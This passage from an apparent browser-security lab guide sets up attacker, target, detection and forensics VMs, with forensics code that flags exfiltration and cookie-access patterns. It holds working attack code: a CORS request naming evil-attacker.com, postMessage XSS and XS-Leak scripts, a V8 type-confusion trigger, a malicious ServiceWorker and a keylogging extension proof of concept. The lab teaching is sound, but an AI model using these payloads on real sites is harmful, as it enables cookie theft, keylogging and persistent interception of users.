            "risk_level": risk_level,
            "obfuscation_detected": obfuscation_detected
        })

    return sorted(results, key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}[x["risk_level"]])

# === ServiceWorker Forensics ===

def analyze_service_workers(profile_path: str) -> list:
    """Analyze registered ServiceWorkers for persistence indicators."""
    sw_dir = os.path.join(profile_path, "Service Worker")
    results = []

    # Check ScriptCache
    script_cache = os.path.join(sw_dir, "ScriptCache")
    if os.path.isdir(script_cache):
        for f in os.listdir(script_cache):
            fpath = os.path.join(script_cache, f)
            if os.path.isfile(fpath):
                with open(fpath, 'rb') as fh:
                    data = fh.read()
                suspicious_patterns = []
                data_str = data.decode('utf-8', errors='ignore')
                if 'importScripts' in data_str:
                    suspicious_patterns.append("IMPORT_SCRIPTS")
                if 'eval(' in data_str:
                    suspicious_patterns.append("EVAL_USAGE")
                if 'document.cookie' in data_str:
                    suspicious_patterns.append("COOKIE_ACCESS")
                if 'fetch(' in data_str and 'POST' in data_str:
                    suspicious_patterns.append("POST_EXFILTRATION")
                if 'crypto.subtle' in data_str:
                    suspicious_patterns.append("CRYPTO_API")

                results.append({
                    "file": f,
                    "size": len(data),
                    "hash_sha256": hashlib.sha256(data).hexdigest(),
                    "suspicious_patterns": suspicious_patterns,
                    "risk": "HIGH" if suspicious_patterns else "LOW"
                })

    return results

# === Crash Dump Analysis ===

def analyze_crash_reports(profile_path: str) -> list:
    """Analyze browser crash reports for exploitation indicators."""
    crash_dirs = [
        os.path.join(profile_path, "..", "Crash Reports"),
        os.path.join(profile_path, "Crash Reports"),
    ]

    results = []
    for crash_dir in crash_dirs:
        if not os.path.isdir(crash_dir):
            continue
        for dump_file in glob.glob(os.path.join(crash_dir, "**", "*.dmp"), recursive=True):
            stat = os.stat(dump_file)
            with open(dump_file, 'rb') as f:
                header = f.read(256)

            # Look for exploitation indicators in the dump header/metadata
            indicators = []
            header_str = header.decode('utf-8', errors='ignore')
            if b'SIGSEGV' in header or b'EXC_BAD_ACCESS' in header:
                indicators.append("SEGFAULT")
            if b'TurboFan' in header or b'Maglev' in header:
                indicators.append("JIT_CODE_CRASH")
            if b'mojo' in header.lower():
                indicators.append("MOJO_IPC_CRASH")

            results.append({
                "file": dump_file,
                "size": stat.st_size,
                "modified": datetime.fromtimestamp(stat.st_mtime, tz=timezone.utc).isoformat(),
                "indicators": indicators,
                "suspicious": bool(indicators)
            })

    return results

# === Full Forensics Report ===

def generate_report(profile_path: str) -> dict:
    """Generate a comprehensive browser forensics report."""
    report = {
        "metadata": {
            "profile_path": profile_path,
            "analysis_time": datetime.now(timezone.utc).isoformat(),
            "tool": "Browser Forensics Toolkit v1.0"
        },
        "history": analyze_chrome_history(profile_path),
        "downloads": analyze_chrome_downloads(profile_path),
        "cookie_audit": audit_chrome_cookies(profile_path),
        "extensions": analyze_chrome_extensions(profile_path),
        "service_workers": analyze_service_workers(profile_path),
        "crash_reports": analyze_crash_reports(profile_path)
    }

    # Summary
    suspicious_history = sum(1 for h in report["history"] if h.get("suspicious"))
    dangerous_downloads = sum(1 for d in report["downloads"] if d.get("dangerous"))
    risky_cookies = sum(1 for c in report["cookie_audit"] if c.get("risk") in ("HIGH", "MEDIUM") and "error" not in c)
    risky_extensions = sum(1 for e in report["extensions"] if e.get("risk_level") in ("CRITICAL", "HIGH"))
    suspicious_sw = sum(1 for s in report["service_workers"] if s.get("risk") == "HIGH")
    suspicious_crashes = sum(1 for c in report["crash_reports"] if c.get("suspicious"))

    report["summary"] = {
        "total_history_entries": len(report["history"]),
        "suspicious_urls": suspicious_history,
        "total_downloads": len(report["downloads"]),
        "dangerous_downloads": dangerous_downloads,
        "total_cookies": len(report["cookie_audit"]),
        "cookies_with_issues": risky_cookies,
        "total_extensions": len(report["extensions"]),
        "risky_extensions": risky_extensions,
        "service_workers": len(report["service_workers"]),
        "suspicious_service_workers": suspicious_sw,
        "crash_reports": len(report["crash_reports"]),
        "suspicious_crashes": suspicious_crashes,
        "overall_risk": "CRITICAL" if (risky_extensions > 0 or suspicious_crashes > 0) else
                        "HIGH" if (dangerous_downloads > 0 or suspicious_sw > 0) else
                        "MEDIUM" if (risky_cookies > 5 or suspicious_history > 0) else "LOW"
    }

    return report

if __name__ == '__main__':
    import sys
    profile = sys.argv[1] if len(sys.argv) > 1 else \
              os.path.expanduser("~/.config/google-chrome/Default")
    report = generate_report(profile)
    print(json.dumps(report, indent=2, default=str))
FORENSICS
chmod +x /opt/forensics/browser_forensics.py

echo "[VM4] Forensics workstation setup complete."
```

### Network Topology

```
┌─────────────────┐     ┌──────────────────┐
│   VM1 (Target)  │     │  VM2 (Attacker)  │
│   10.8.1.10     │◄───►│   10.8.1.20      │
│ Browser apps    │     │ Fuzzing/exploit   │
│ :3000-3005      │     │ tools             │
└────────┬────────┘     └────────┬─────────┘
         │                       │
    ─────┼───────────────────────┼────────
         │       10.8.1.0/24     │
    ─────┼───────────────────────┼────────
         │                       │
┌────────┴────────┐     ┌────────┴─────────┐
│ VM3 (Detection) │     │ VM4 (Forensics)  │
│   10.8.1.30     │     │   10.8.1.40      │
│ YARA/Sigma/     │     │ Browser artifact │
│ Suricata/ELK    │     │ analysis         │
└─────────────────┘     └──────────────────┘
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: V8 Type Confusion — Understanding Exploitation Primitives

**Objective:** Understand V8's internal object representation (Maps, element kinds, pointer compression), the JIT compilation pipeline (Ignition → Sparkplug → Maglev → TurboFan), and how type confusion bugs produce the `addrof`/`fakeobj` primitives that enable full renderer exploitation.

**Step 1 — Explore V8 object representation with d8 debug shell.**

```bash
# On VM1 (or VM2 if d8 is built)
# Run with V8 intrinsics enabled
d8 --allow-natives-syntax /opt/browser-lab/v8-exercises/01_type_confusion_demo.js
```

**Expected output:**

```
=== Array Element Kinds ===
double_arr elements kind: DOUBLE
obj_arr elements kind: OBJECT

=== Map Transitions ===
Before property addition:
  Map ID: same as {}
After adding .x:
  Map ID: same as {x:1}

=== Optimization ===
add(1, 2) = 3
Optimized: YES
add('x', 'y') = xy
Still optimized: NO

=== Elements Kind Lattice ===
Initial (SMI): true
After push(1.5) — DOUBLE: true
After push({}) — OBJECT: true
```

**Step 2 — Understand the addrof/fakeobj exploitation chain.**

```bash
d8 --allow-natives-syntax /opt/browser-lab/v8-exercises/02_addrof_fakeobj_concept.js
```

Examine the output to understand:
1. How `addrof` leaks an object's heap address by reading a tagged pointer as float64
2. How `fakeobj` creates a fake object by writing a float64 where a tagged pointer is expected
3. How arbitrary R/W is constructed from these two primitives
4. How Wasm RWX page shellcode injection works (and why W^X mitigates it)
5. How the V8 Heap Sandbox (EPT/CPT/TPT) raises the exploitation bar

**Step 3 — Analyze real CVE patterns.**

```bash
# CVE-2020-6418 trigger pattern analysis
cat << 'CVE_ANALYSIS'
CVE-2020-6418 — V8 Type Confusion (JSCreate side-effect modeling)

Root cause: TurboFan's LoadElimination pass assumed JSCreate (object 
construction via 'new') had no side effects on the receiver's Map.
In reality, the constructor could modify the receiver, transitioning 
its Map.

Trigger pattern (simplified):
  function vuln(x) {
    let v = x.a;              // TurboFan records x's Map here
    let obj = new SomeCtor(); // JSCreate — should invalidate x's Map assumption
    return x.b;               // Reads x.b using OLD Map offset (bug!)
  }

The patch: mark JSCreate as potentially having side effects on the 
receiver's Map → forces re-check after construction.

Impact: addrof → fakeobj → arb-RW → shellcode → renderer RCE
Chained with Mojo IPC bug for full sandbox escape.
CVSS: 8.8 | CWE: CWE-843
CVE_ANALYSIS
```

**Step 4 — V8 Heap Sandbox analysis.**

```javascript
// Run in d8 with --sandbox-testing (if available)
// Or analyze conceptually:

// Pre-sandbox: ArrayBuffer stores raw C++ pointer to backing store
// var ab = new ArrayBuffer(64);
// ab internals: { Map, Properties, Elements, ByteLength, BackingStore* }
//                                                        ^^^^^^^^^^^
//                                                        raw pointer → exploit target

// Post-sandbox: BackingStore* replaced with EPT index
// ab internals: { Map, Properties, Elements, ByteLength, EPT_Index(32-bit) }
//                                                        ^^^^^^^^^^^^^^^^^
//                                                        index into External Pointer Table
// EPT[index] = { pointer(48 bits) | tag(16 bits) }
// Tag must match expected type (kArrayBufferBackingStoreTag)
// Corruption of EPT index → wrong entry, wrong tag → CRASH (not exploit)
```

**Verification:** Confirm understanding of:
- V8 Map transitions and element kind lattice
- TurboFan speculative optimization and deoptimization guards
- The canonical type confusion → addrof/fakeobj → arb-RW → shellcode chain
- V8 Heap Sandbox's EPT/CPT/TPT defense mechanism

---

### Exercise 2: Browser Sandbox Architecture Analysis

**Objective:** Analyze Chrome's multi-process sandbox architecture on Linux — inspect namespace isolation, seccomp-BPF filters, process hierarchy, and identify the security boundaries between renderer, GPU, network, and browser processes.

**Step 1 — Launch Chromium with verbose logging and inspect processes.**

```bash
# On VM1 — start Chromium in headless mode with Xvfb
export DISPLAY=:99
Xvfb :99 -screen 0 1920x1080x24 &

chromium-browser --no-first-run --disable-default-apps \
  --user-data-dir=/tmp/chrome-sandbox-lab \
  --enable-logging=stderr --v=1 \
  "http://10.8.1.10:3000" &

sleep 5

# Examine process tree
echo "=== Chrome Process Tree ==="
pstree -p $(pgrep -f 'chromium.*--type=zygote' | head -1) 2>/dev/null

# List all Chrome process types
echo -e "\n=== Chrome Process Types ==="
ps aux | grep chromium | grep -v grep | while read line; do
  pid=$(echo "$line" | awk '{print $2}')
  type=$(echo "$line" | grep -oP '(?<=--type=)\w+' || echo "browser (main)")
  echo "PID $pid: $type"
done
```

**Expected output:**

```
=== Chrome Process Types ===
PID 1234: browser (main)
PID 1235: zygote
PID 1236: zygote
PID 1240: gpu-process
PID 1245: utility
PID 1250: renderer
PID 1255: renderer
```

**Step 2 — Inspect renderer sandbox configuration.**

```bash
RENDERER_PID=$(ps aux | grep 'chromium.*--type=renderer' | grep -v grep | head -1 | awk '{print $2}')

echo "=== Renderer Process Sandbox (PID: $RENDERER_PID) ==="

# Namespace isolation
echo -e "\n--- Namespaces ---"
ls -la /proc/$RENDERER_PID/ns/

# Compare with browser (main) process namespaces
BROWSER_PID=$(pgrep -f 'chromium' | head -1)
echo -e "\n--- Browser process namespaces (for comparison) ---"
ls -la /proc/$BROWSER_PID/ns/

# Check if namespaces differ
echo -e "\n--- Namespace comparison ---"
for ns in user pid net mnt; do
  renderer_ns=$(readlink /proc/$RENDERER_PID/ns/$ns 2>/dev/null)
  browser_ns=$(readlink /proc/$BROWSER_PID/ns/$ns 2>/dev/null)
  if [ "$renderer_ns" != "$browser_ns" ]; then
    echo "$ns: ISOLATED (renderer: $renderer_ns, browser: $browser_ns)"
  else
    echo "$ns: SHARED"
  fi
done

# Seccomp status
echo -e "\n--- Seccomp Status ---"
grep Seccomp /proc/$RENDERER_PID/status
# Expected: Seccomp: 2  (MODE_FILTER)

# No new privs
echo -e "\n--- NoNewPrivs ---"
grep NoNewPrivs /proc/$RENDERER_PID/status
# Expected: NoNewPrivs: 1

# Capabilities (should be empty for renderer)
echo -e "\n--- Capabilities ---"
grep Cap /proc/$RENDERER_PID/status

# Network namespace (should have no interfaces)
echo -e "\n--- Network in renderer namespace ---"
nsenter -t $RENDERER_PID -n ip addr 2>&1 || echo "(Cannot enter — expected for isolated process)"

# Open file descriptors
echo -e "\n--- Open FDs (should be minimal) ---"
ls -la /proc/$RENDERER_PID/fd/ | wc -l
ls -la /proc/$RENDERER_PID/fd/ | head -15
```

**Step 3 — Compare GPU process sandbox (less restrictive).**

```bash
GPU_PID=$(ps aux | grep 'chromium.*--type=gpu-process' | grep -v grep | head -1 | awk '{print $2}')

echo "=== GPU Process Sandbox (PID: $GPU_PID) ==="
grep Seccomp /proc/$GPU_PID/status
grep NoNewPrivs /proc/$GPU_PID/status
echo "FDs:"
ls /proc/$GPU_PID/fd/ | wc -l

# GPU process has more allowed syscalls (ioctl for GPU driver)
echo -e "\n--- Strace sample (2 seconds) ---"
timeout 2 strace -f -c -p $GPU_PID 2>&1 | tail -20
```

**Step 4 — Analyze Mojo IPC channels.**

```bash
# Examine Mojo message pipe file descriptors
echo "=== Mojo IPC Channels ==="
ls -la /proc/$RENDERER_PID/fd/ | grep -E 'pipe|socket'

# The renderer communicates ONLY through Mojo pipes to the browser process
# No direct filesystem, network, or device access
echo -e "\n--- Maps showing no direct file/device access ---"
grep -c '/dev/' /proc/$RENDERER_PID/maps  # Should be 0 or very few
grep -c 'socket:' /proc/$RENDERER_PID/fd/ 2>/dev/null || echo "0 sockets (expected)"
```

**Verification:** Document the security boundaries:
- Renderer: tightest sandbox (seccomp MODE_FILTER, user/PID/net namespaces, no filesystem)
- GPU: looser (ioctl allowed, device access for GPU drivers)
- Network: no filesystem, restricted syscalls
- Browser: unsandboxed (full system access — the ultimate escalation target)

---

### Exercise 3: Same-Origin Policy Bypass and XS-Leak Exploitation

**Objective:** Exploit SOP relaxation mechanisms (CORS misconfiguration, JSONP, postMessage) and cross-site leak side channels (frame counting, timing oracle) to extract cross-origin information.

**Step 1 — CORS misconfiguration: reflected origin.**

```bash
# On VM2 — demonstrate reflected origin CORS bypass

# First, authenticate to get a session
curl -v -c /tmp/cookies.txt \
  -d "username=admin&password=secret123" \
  http://10.8.1.10:3000/login

# Verify CORS misconfiguration: server reflects any Origin
curl -v -b /tmp/cookies.txt \
  -H "Origin: https://evil-attacker.com" \
  http://10.8.1.10:3000/api/sensitive

# Expected response headers:
# Access-Control-Allow-Origin: https://evil-attacker.com  ← reflected!
# Access-Control-Allow-Credentials: true
# Response body contains secret data
```

**Expected output:**

```
< Access-Control-Allow-Origin: https://evil-attacker.com
< Access-Control-Allow-Credentials: true
{
  "secret": "FLAG{cors_misconfiguration_reflected_origin}",
  "user": "admin",
  "token": "a1b2c3..."
}
```

**Step 2 — JSONP data exfiltration.**

```bash
# JSONP endpoints bypass SOP entirely — any page can include the script tag
curl -b /tmp/cookies.txt \
  "http://10.8.1.10:3000/api/userinfo?callback=stolen"

# Expected: stolen({"username":"admin","isAdmin":true,...})
# Any page can include <script src="http://target/api/userinfo?callback=x">
# and the data executes in the attacker's context
```

**Step 3 — postMessage origin validation bypass.**

```python
#!/usr/bin/env python3
# postmessage_exploit.py — Exploit missing origin validation
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    
    # Page 1: Attacker page
    attacker_page = browser.new_page()
    attacker_page.set_content("""
    <html><body>
    <iframe id="target" src="http://10.8.1.10:3000/widget"></iframe>
    <script>
      const iframe = document.getElementById('target');
      iframe.onload = () => {
        // Send malicious postMessage — no origin check on receiver
        iframe.contentWindow.postMessage(
          '<img src=x onerror="document.title=document.cookie">',
          '*'
        );
      };
      
      // Listen for leaked data from the widget
      window.addEventListener('message', (e) => {
        document.title = 'LEAKED: ' + JSON.stringify(e.data);
        console.log('Stolen data:', JSON.stringify(e.data));
      });
    </script>
    </body></html>
    """)
    
    attacker_page.wait_for_timeout(3000)
    print(f"Page title (leaked data): {attacker_page.title()}")
    browser.close()
```

**Step 4 — XS-Leak: Frame count oracle.**

```python
#!/usr/bin/env python3
# xs_leak_frame_count.py — Detect admin status via frame counting
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    context = browser.new_context()
    
    # First: authenticate as admin
    page = context.new_page()
    page.goto("http://10.8.1.10:3000/login")
    page.fill('input[name="username"]', 'admin')
    page.fill('input[name="password"]', 'secret123')
    page.click('button[type="submit"]')
    page.wait_for_url("**/dashboard")
    print(f"[+] Authenticated. Current URL: {page.url()}")
    
    # XS-Leak: Open dashboard and count frames
    frame_count = page.evaluate("""
      () => {
        return window.frames.length;
      }
    """)
    print(f"[+] Frame count on dashboard: {frame_count}")
    
    if frame_count == 3:
        print("[!] User is ADMIN — dashboard has 3 iframes (stats, users, logs)")
    else:
        print("[-] User is NOT admin")
    
    # Now test from a "cross-origin" perspective using window.open
    # A cross-origin page can still read window.frames.length!
    attacker = context.new_page()
    attacker.set_content("""
    <html><body>
    <script>
      const w = window.open('http://10.8.1.10:3000/dashboard');
      setTimeout(() => {
        document.title = 'frames:' + w.frames.length;
        w.close();
      }, 2000);
    </script>
    </body></html>
    """)
    attacker.wait_for_timeout(3000)
    print(f"[+] Cross-origin frame count: {attacker.title()}")
    
    browser.close()
```

**Step 5 — XS-Leak: Timing side-channel.**

```bash
# On VM2 — run the timing-based user extraction
python3 /opt/xsleak-tools/timing_leak.py
```

**Expected output:**

```
[+] Authenticated. Session: a1b2c3d4e5f6...
[*] Extracting usernames via timing oracle...
[*] Baseline timing (empty query):
    Empty query: 300.0ms (all users match)
    'a': 150.0ms → ~3 users starting with 'a'
    'b': 50.0ms → ~1 user(s) starting with 'b'
    'c': 50.0ms → ~1 user(s) starting with 'c'
    'd': 50.0ms → ~1 user(s) starting with 'd'
    'e': 50.0ms → ~1 user(s) starting with 'e'
[*] Deep extraction (2-character prefixes):
    'ad': ~1 match(es)
    'al': ~1 match(es)
    'bo': ~1 match(es)
```

**Verification:** Confirm exploitation of all four SOP/XS-Leak vectors and document which mitigations would prevent each:
- CORS: validate Origin against explicit allowlist
- JSONP: remove; use CORS instead
- postMessage: always validate `event.origin`
- Frame count: `X-Frame-Options: DENY` + `Cross-Origin-Opener-Policy: same-origin`
- Timing: constant-time responses + rate limiting

---

### Exercise 4: Browser Fingerprinting Techniques

**Objective:** Implement and analyze 9 fingerprinting vectors (Navigator, Screen, Canvas, WebGL, AudioContext, Fonts, Timezone, Hardware, Network/TLS), estimate combined entropy, and test anti-fingerprinting defenses.

**Step 1 — Run the fingerprinting lab.**

```bash
# On VM2 — open the fingerprint lab
# Using Playwright for automated testing
python3 << 'FPTEST'
from playwright.sync_api import sync_playwright
import json

with sync_playwright() as p:
    # Test with standard Chromium
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    page.goto("http://10.8.1.10:3004")
    page.wait_for_timeout(3000)
    
    # Extract all fingerprint data
    fp_data = page.evaluate("""() => {
        return JSON.stringify(window.results || {}, null, 2);
    }""")
    print("=== Chromium Fingerprint ===")
    print(fp_data)
    
    combined = page.locator('#combined-output').text_content()
    print(f"\n=== Combined ===\n{combined}")
    browser.close()
    
    # Test with Firefox
    browser = p.firefox.launch(headless=True)
    page = browser.new_page()
    page.goto("http://10.8.1.10:3004")
    page.wait_for_timeout(3000)
    
    fp_data = page.evaluate("""() => {
        return JSON.stringify(window.results || {}, null, 2);
    }""")
    print("\n=== Firefox Fingerprint ===")
    print(fp_data)
    browser.close()
FPTEST
```

**Step 2 — Canvas fingerprinting deep dive.**

```python
#!/usr/bin/env python3
# canvas_fingerprint_comparison.py
from playwright.sync_api import sync_playwright
import hashlib

CANVAS_SCRIPT = """() => {
    const canvas = document.createElement('canvas');
    canvas.width = 300; canvas.height = 60;
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Fingerprint Test', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Canvas Rendering', 4, 35);
    return canvas.toDataURL();
}"""

with sync_playwright() as p:
    hashes = {}
    for browser_type in [p.chromium, p.firefox]:
        name = browser_type.name
        browser = browser_type.launch(headless=True)
        page = browser.new_page()
        page.goto("about:blank")
        data_url = page.evaluate(CANVAS_SCRIPT)
        h = hashlib.sha256(data_url.encode()).hexdigest()[:16]
        hashes[name] = h
        print(f"{name}: canvas hash = {h} (data URL length: {len(data_url)})")
        browser.close()

    if hashes.get('chromium') != hashes.get('firefox'):
        print("\n[+] Canvas fingerprints DIFFER between browsers — expected")
    print(f"\nEntropy contribution: ~8-12 bits")
```

**Step 3 — JA3/JA4 TLS fingerprinting (network-level).**

```bash
# On VM2 — capture TLS ClientHello for JA3 fingerprinting
# Requires tshark
tshark -i eth0 -w /tmp/tls_capture.pcap -f "tcp port 443" -c 50 &
TSHARK_PID=$!

# Trigger HTTPS connections from different browsers
python3 -c "
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    for bt in [p.chromium, p.firefox]:
        b = bt.launch(headless=True)
        pg = b.new_page()
        try: pg.goto('https://example.com', timeout=5000)
        except: pass
        b.close()
"

kill $TSHARK_PID 2>/dev/null

# Extract JA3 hashes
tshark -r /tmp/tls_capture.pcap \
  -Y "tls.handshake.type == 1" \
  -T fields \
  -e ip.src -e tls.handshake.ja3_full -e tls.handshake.ja3 \
  2>/dev/null | head -10

echo -e "\nJA3 fingerprint identifies the browser/TLS stack at the network level."
echo "Different browsers produce different JA3 hashes even on the same machine."
```

**Verification:** Compare fingerprint hashes between Chromium and Firefox. Document the entropy contribution of each vector and calculate total combined entropy.

---

### Exercise 5: Cookie Security Analysis and Exploitation

**Objective:** Analyze cookie security attributes (Secure, HttpOnly, SameSite, `__Host-` prefix, Partitioned/CHIPS), demonstrate cookie theft via JavaScript access, and test SameSite CSRF protection.

**Step 1 — Set test cookies and audit attributes.**

```bash
# On VM2 — set cookies and inspect
curl -v -c /tmp/cookie-lab.txt \
  http://10.8.1.10:3002/set-cookies

echo -e "\n=== Cookie Jar Contents ==="
cat /tmp/cookie-lab.txt

echo -e "\n=== Cookie Security Audit ==="
python3 << 'AUDIT'
import http.cookiejar
cj = http.cookiejar.MozillaCookieJar('/tmp/cookie-lab.txt')
cj.load(ignore_discard=True, ignore_expires=True)

for cookie in cj:
    issues = []
    if not cookie.secure:
        issues.append("MISSING_SECURE")
    if 'httponly' not in str(cookie._rest).lower():
        issues.append("MISSING_HTTPONLY")
    if cookie.domain.startswith('.') and cookie.domain.count('.') <= 1:
        issues.append("OVERLY_BROAD_DOMAIN")
    
    risk = "HIGH" if len(issues) >= 2 else ("MEDIUM" if issues else "LOW")
    print(f"  {cookie.name}: domain={cookie.domain} secure={cookie.secure} "
          f"issues={issues} risk={risk}")
AUDIT
```

**Step 2 — Demonstrate document.cookie theft (non-HttpOnly cookies).**

```python
#!/usr/bin/env python3
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    
    # Set cookies
    page.goto("http://10.8.1.10:3002/set-cookies")
    
    # Read document.cookie — only non-HttpOnly cookies visible
    cookies_js = page.evaluate("() => document.cookie")
    print(f"document.cookie (attacker-accessible):\n  {cookies_js}")
    
    # Show which cookies are protected
    all_cookies = page.context.cookies()
    print(f"\nAll cookies ({len(all_cookies)} total):")
    for c in all_cookies:
        accessible = "JS-ACCESSIBLE" if not c.get('httpOnly') else "PROTECTED (HttpOnly)"
        print(f"  {c['name']}: {accessible} | secure={c.get('secure')} | sameSite={c.get('sameSite')}")
    
    browser.close()
```

**Verification:** Identify which cookies are vulnerable to XSS theft (non-HttpOnly), which lack CSRF protection (non-SameSite), and which use proper `__Host-` prefix hardening.

---

### Exercise 6: ServiceWorker Persistence Attack

**Objective:** Demonstrate how a malicious ServiceWorker registered via XSS achieves persistent man-in-the-middle on all requests within scope — surviving page reloads, browser restarts, and even XSS patch deployment.

**Step 1 — Register the malicious ServiceWorker.**

```python
#!/usr/bin/env python3
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    page.goto("http://10.8.1.10:3003")
    
    # Register the "evil" ServiceWorker (simulating XSS-triggered registration)
    page.click('#register-evil')
    page.wait_for_timeout(2000)
    
    status = page.locator('#status').text_content()
    print(f"[+] ServiceWorker registration: {status}")
    
    # Verify it intercepts requests
    page.click('button:has-text("Fetch /api/data")')
    page.wait_for_timeout(1000)
    intercepted = page.locator('#intercepted').text_content()
    print(f"[+] Intercepted response: {intercepted}")
    
    # Close and reopen — SW persists!
    page.close()
    page2 = browser.new_page()
    page2.goto("http://10.8.1.10:3003")
    page2.wait_for_timeout(2000)
    
    page2.click('button:has-text("Fetch /api/data")')
    page2.wait_for_timeout(1000)
    intercepted2 = page2.locator('#intercepted').text_content()
    print(f"[+] After page reload, response still intercepted: {intercepted2}")
    
    # Check SW registrations
    sw_list = page2.evaluate("""async () => {
        const regs = await navigator.serviceWorker.getRegistrations();
        return regs.map(r => ({scope: r.scope, active: r.active?.scriptURL}));
    }""")
    print(f"[+] Active ServiceWorkers: {sw_list}")
    
    # Cleanup — unregister
    page2.click('#unregister')
    page2.wait_for_timeout(1000)
    print("[+] ServiceWorkers unregistered")
    
    browser.close()
```

**Expected output:**

```
[+] ServiceWorker registration: Malicious SW registered: http://10.8.1.10:3003/
[+] Intercepted response: {"data":"...","injected":"EVIL_SW_PAYLOAD"}
[+] After page reload, response still intercepted: {"data":"...","injected":"EVIL_SW_PAYLOAD"}
[+] Active ServiceWorkers: [{'scope': 'http://10.8.1.10:3003/', 'active': 'http://10.8.1.10:3003/sw-evil.js'}]
```

**Key takeaway:** The ServiceWorker persists even after the page is closed and reopened. In a real attack, the XSS vulnerability could be patched, but the SW remains active until explicitly unregistered — providing persistent credential theft, response modification, and offline cache poisoning.

**Mitigation:** `Clear-Site-Data: "storage"` header in the XSS fix response to force SW unregistration.

---

### Exercise 7: Extension Security Analysis — Malicious Extension Simulation

**Objective:** Build a proof-of-concept Chrome extension demonstrating keylogging, cookie theft, and DOM data exfiltration techniques used by malicious extensions. Analyze the permission model boundaries.

**Step 1 — Create a PoC extension.**

```bash
mkdir -p /tmp/evil-ext-poc

cat > /tmp/evil-ext-poc/manifest.json << 'MANIFEST'
{
  "manifest_version": 3,
  "name": "Security Research Extension (PoC)",
  "version": "1.0",
  "description": "Educational PoC for extension security analysis",
  "permissions": ["activeTab", "scripting"],
  "content_scripts": [
    {
      "matches": ["http://10.8.1.10:3001/*"],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ],
  "background": {
    "service_worker": "background.js"
  }
}
MANIFEST

cat > /tmp/evil-ext-poc/content.js << 'CONTENT'
// Content script — runs in isolated world, shares DOM with page

// 1. Keylogging via DOM event listener
document.addEventListener('keydown', (e) => {
  const target = e.target.tagName + (e.target.type ? '[' + e.target.type + ']' : '');
  console.log('[EXT-POC] Keystroke:', e.key, 'in', target);
  // In malicious ext: chrome.runtime.sendMessage({type:'keylog', key:e.key, target});
});

// 2. Form data interception
document.querySelectorAll('form').forEach(form => {
  form.addEventListener('submit', (e) => {
    const formData = new FormData(form);
    const data = Object.fromEntries(formData);
    console.log('[EXT-POC] Form submission intercepted:', JSON.stringify(data));
    // In malicious ext: exfiltrate to C2
  });
});

// 3. DOM data extraction (shared DOM = content script can read everything)
const sensitiveSelectors = [
  '[data-secret]',
  'input[type="password"]',
  'input[name*="card"]',
  'input[name*="cc"]',
  'input[name*="credit"]',
];

sensitiveSelectors.forEach(sel => {
  document.querySelectorAll(sel).forEach(el => {
    console.log('[EXT-POC] Sensitive element found:', sel,
      'value:', el.value || el.getAttribute('data-secret'));
  });
});

// 4. Access page's JavaScript variables via DOM injection
const script = document.createElement('script');
script.textContent = `
  if (window.__APP_CONFIG) {
    document.dispatchEvent(new CustomEvent('__ext_data', {
      detail: JSON.stringify(window.__APP_CONFIG)
    }));
  }
`;
document.head.appendChild(script);

document.addEventListener('__ext_data', (e) => {
  console.log('[EXT-POC] Page JS variables extracted:', e.detail);
});

console.log('[EXT-POC] Content script loaded — monitoring active');
CONTENT

cat > /tmp/evil-ext-poc/background.js << 'BACKGROUND'
// Background service worker
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  console.log('[EXT-POC] Message from content:', JSON.stringify(msg));
});

console.log('[EXT-POC] Background service worker started');
BACKGROUND

echo "[+] PoC extension created at /tmp/evil-ext-poc/"
echo "    Load via chrome://extensions → Developer mode → Load unpacked"
```

**Step 2 — Analyze the extension with the forensics toolkit.**

```bash
# On VM4 — use the extension analyzer
python3 << 'EXT_ANALYZE'
import json, os

manifest_path = "/tmp/evil-ext-poc/manifest.json"
with open(manifest_path) as f:
    manifest = json.load(f)

perms = manifest.get("permissions", [])
content_scripts = manifest.get("content_scripts", [])
host_perms = manifest.get("host_permissions", [])

print("=== Extension Security Analysis ===")
print(f"Name: {manifest['name']}")
print(f"Manifest Version: {manifest['manifest_version']}")
print(f"Permissions: {perms}")
print(f"Host Permissions: {host_perms}")
print(f"Content Scripts: {len(content_scripts)} injection(s)")

for cs in content_scripts:
    print(f"  Matches: {cs['matches']}")
    print(f"  Scripts: {cs['js']}")
    print(f"  Run at: {cs.get('run_at', 'document_idle')}")

# Risk assessment
risks = []
if "<all_urls>" in perms or "<all_urls>" in host_perms:
    risks.append("ALL_URLS — can access every website")
if "cookies" in perms:
    risks.append("COOKIES — can read HttpOnly cookies (bypasses JS restriction)")
if "webRequest" in perms or "webRequestBlocking" in perms:
    risks.append("WEB_REQUEST — can intercept/modify all HTTP traffic")
if "nativeMessaging" in perms:
    risks.append("NATIVE_MESSAGING — can communicate with native binaries")

# Check content script for suspicious patterns
for cs in content_scripts:
    for js_file in cs['js']:
        path = os.path.join(os.path.dirname(manifest_path), js_file)
        if os.path.exists(path):
            with open(path) as f:
                code = f.read()
            if 'keydown' in code or 'keyup' in code:
                risks.append(f"KEYLOGGING in {js_file}")
            if 'document.cookie' in code:
                risks.append(f"COOKIE_ACCESS in {js_file}")
            if 'FormData' in code:
                risks.append(f"FORM_INTERCEPTION in {js_file}")
            if 'eval(' in code or 'Function(' in code:
                risks.append(f"CODE_INJECTION in {js_file}")

print(f"\nRisk Indicators: {len(risks)}")
for r in risks:
    print(f"  [!] {r}")

risk_level = "CRITICAL" if len(risks) >= 3 else "HIGH" if len(risks) >= 2 else "MEDIUM" if risks else "LOW"
print(f"\nOverall Risk: {risk_level}")
EXT_ANALYZE
```

**Verification:** Document each attack vector (keylogging, form interception, DOM data extraction, page variable theft) and the MV3 restrictions that limit each.

---

